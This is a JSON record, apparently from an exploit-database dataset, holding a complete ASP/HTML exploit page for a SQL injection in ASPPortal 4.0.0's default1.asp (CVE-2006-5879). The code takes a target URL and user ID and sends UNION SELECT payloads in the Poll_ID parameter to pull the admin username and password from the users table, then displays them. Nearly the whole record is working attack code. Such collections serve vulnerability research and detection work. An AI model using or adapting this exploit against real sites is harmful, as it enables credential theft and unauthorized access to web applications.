{
  "id": "2762",
  "title": "ASPPortal 4.0.0 - &#039;default1.asp&#039; SQL Injection",
  "cve": "CVE-2006-5879",
  "vuln_type": "sqli",
  "code": "<% Response.Buffer = True %>\r\n<% On Error Resume Next %>\r\n<% Server.ScriptTimeout = 100 %>\r\n\r\n<%\r\n\r\n'===============================================================================================\r\n'[Script Name: ASPPortal <= 4.0.0(default1.asp) Remote SQL Injection Exploit\r\n'[Coded by   : ajann\r\n'[Author   : ajann\r\n'[Contact    : :(\r\n'[ExploitName: exploit1.asp\r\n\r\n'[Note : exploit file name =>exploit1.asp\r\n'[Using : Write Target and ID after Submit Click\r\n'[Using : Tr:Al\u00fdnan Sifreyi Perl scriptinde c\u00f6z\u00fcn.\r\n'[Using : Tr:Scriptin Tr Dilinde bu exploitle bilgileri alamassiniz,manuel cekebilirsiniz\r\n'[Using : Tr:Kimsenin boyle yapicak kadar seviyesiz oldunu d\u00fcs\u00fcnm\u00fcyorum.\r\n'===============================================================================================\r\n'use sub decrypt() from http://www.milw0rm.com/exploits/1597 to decrypt /str0ke\r\n\r\n%>\r\n\r\n<html>\r\n<title>ASPPortal <= 4.0.0 (default1.asp) Remote SQL Injection Exploit</title>\r\n<head>\r\n\r\n<script language=\"JavaScript\">    \r\n  function functionControl1(){  \r\n        setTimeout(\"functionControl2()\",2000);    \r\n     }  \r\n  \r\n  function functionControl2(){  \r\n            if(document.form1.field1.value==\"\"){  \r\n \r\n     alert(\"[Exploit Failed]=>The Username and Password Didnt Take,Try Again\");\r\n        \r\n                             }  \r\n                        }\r\n\r\n  function writetext() {\r\n\r\n            if(document.form1.field1.value==\"\"){\r\ndocument.getElementById('htmlAlani').innerHTML='<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#008000\\\">There is a problem... The Data Didn\\'t Take </font>'\r\n\r\n                            }\r\n                 }\r\n  function write(){  \r\n        setTimeout(\"writetext()\",1000);    \r\n     }  \r\n  \r\n</script>\r\n\r\n\r\n</head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1254\">\r\n<body bgcolor=\"#000000\" link=\"#008000\" vlink=\"#008000\" alink=\"#008000\">\r\n\r\n<center>\r\n<font face=\"Verdana\" size=\"2\" color=\"#008000\"><b><a href=\"exploit1.asp\">ASPPortal <=</b>v4.0.0(default1.asp) <u><b>\r\nRemote SQL Injection Exploit</b></u></a></font><br><br>\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" width=\"35%\" id=\"AutoNumber1\" bordercolorlight=\"#808080\" bordercolordark=\"#008000\" bordercolor=\"#808080\">\r\n  <tr>\r\n    <td width=\"50%\" bgcolor=\"#808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\">\r\n    <font face=\"Arial\" size=\"1\"><b><font color=\"#FFFFFF\">TARGET:</font>Example:[http://x.com/path]</b></font><p>\r\n    <b><font face=\"Arial\" size=\"1\" color=\"#FFFFFF\">USER ID:</font></b><font face=\"Arial\" size=\"1\"><b>Example:[User \r\n    ID=1]</b></font></td>\r\n    <td width=\"50%\"><center>\r\n<form method=\"post\" name=\"form1\" action=\"exploit1.asp?islem=get\">\r\n<input type=\"text\" name=\"text1\" value=\"http://\" size=\"25\" style=\"background-color: #808080\"><br><input type=\"text\" name=\"id\" value=\"1\" size=\"25\" style=\"background-color: #808080\">\r\n<input type=\"submit\" value=\"Get\"></center></td>\r\n  </tr>\r\n\r\n</table>\r\n\r\n<div id=htmlAlani></div>\r\n\r\n<%\r\nislem = Request.QueryString(\"islem\")    \r\nIf islem = \"hata1\" Then \r\nResponse.Write \"<font face=\"\"Verdana\"\" size=\"\"1\"\" color=\"\"#008000\"\">There is a problem! Please complete to the whole spaces</font>\"\r\nEnd If\r\nIf islem = \"hata2\" Then \r\nResponse.Write \"<font face=\"\"Verdana\"\" size=\"\"1\"\" color=\"\"#008000\"\">There is a problem! Please right character use</font>\"\r\nEnd If\r\nIf islem = \"hata3\" Then \r\nResponse.Write \"<font face=\"\"Verdana\"\" size=\"\"1\"\" color=\"\"#008000\"\">There is a problem! Add \"\"http://\"\"</font>\"\r\nEnd If\r\n%>\r\n\r\n<%  \r\n\r\nIf islem = \"get\" Then\r\n\r\nstring1=\"default1.asp\"\r\nstring2=\"default1.asp\"\r\ncek= Request.Form(\"id\")\r\n\r\n\r\ntargettext = Request.Form(\"text1\")\r\narama=InStr(1, targettext, \"union\" ,1)\r\narama2=InStr(1, targettext, \"http://\" ,1)\r\n\r\nIf targettext=\"\" Then\r\nResponse.Redirect(\"exploit1.asp?islem=hata1\")\r\n\r\nElse\r\nIf arama>0 then \r\nResponse.Redirect(\"exploit1.asp?islem=hata2\")\r\n\r\nElse\r\nIf arama2=0 then \r\nResponse.Redirect(\"exploit1.asp?islem=hata3\")\r\n\r\nElse\r\n%> \r\n\r\n<%\r\n\r\ntarget1 = targettext+string1\r\ntarget2 = targettext+string2\r\n\r\nPublic Function take(come)\r\nSet objtake = Server.CreateObject(\"Microsoft.XMLHTTP\" )\r\nWith objtake\r\n  .Open \"POST\" , come, FALSE\r\n  .setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\"\r\n  .send \"Voteit=1&Poll_ID=-1%20union%20select%200,username,0,0,0,0,0,0,0%20from%20users%20where%20user_id%20like%20\"+cek\r\ntake =  .Responsetext\r\nEnd With\r\nSET objtake = Nothing\r\nEnd Function\r\n\r\nPublic Function take1(come1)\r\nSet objtake1 = Server.CreateObject(\"Microsoft.XMLHTTP\" )\r\nWith objtake1\r\n  .Open \"POST\" , come1, FALSE\r\n  .setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\"\r\n  .send \"Voteit=1&Poll_ID=-1%20union%20select%200,password,0,0,0,0,0,0,0%20from%20users%20where%20user_id%20like%20\"+cek\r\ntake1 =  .Responsetext\r\nEnd With\r\nSET objtake1 = Nothing\r\nEnd Function\r\n\r\nget_username = take(target1)\r\nget_password = take1(target2)\r\n\r\ngetdata=InStr(get_username,\"Poll Question:</b>&nbsp;\" )\r\nusername=Mid(get_username,getdata+24,14)\r\npasswd=Mid(get_password,getdata+24,14)\r\n\r\n%>\r\n<center>\r\n<font face=\"Verdana\" size=\"2\" color=\"#008000\"> <u><b>\r\najann<br></b></u></font>\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" width=\"35%\" id=\"AutoNumber1\" bordercolorlight=\"#808080\" bordercolordark=\"#008000\" bordercolor=\"#808080\">\r\n  <tr>\r\n    <td width=\"50%\" bgcolor=\"#808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n    <b><font size=\"2\" face=\"Arial\">User Name:</font></b></td>\r\n    <td width=\"50%\">&nbsp;<b><font color=\"#C0C0C0\" size=\"2\" face=\"Verdana\"><%=username%></font></b></td>\r\n  </tr>\r\n  <tr>\r\n    <td width=\"50%\" bgcolor=\"#808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n    <b><font size=\"2\" face=\"Arial\">&nbsp;User Password:</font></b></td>\r\n    <td width=\"50%\">&nbsp;<b><font color=\"#C0C0C0\" size=\"2\" face=\"Verdana\"><%=passwd%></font></b></td>\r\n  </tr>\r\n\r\n</table>\r\n\r\n<form method=\"POST\" name=\"form2\" action=\"#\">    \r\n<input type=\"hidden\" name=\"field1\" size=\"20\" value=\"<%=passwd%>\"></p>      \r\n</form> \r\n\r\n</center>\r\n\r\n<script language=\"JavaScript\">\r\nwrite()\r\nfunctionControl1()\r\n</script>\r\n\r\n</body>\r\n</html>\r\n\r\n<%\r\nEnd If\r\nEnd If\r\nEnd If\r\nEnd If\r\nSet objtake = Nothing \r\n%>\r\n\r\n# milw0rm.com [2006-11-12]",
  "url": "https://www.exploit-db.com/exploits/2762"
}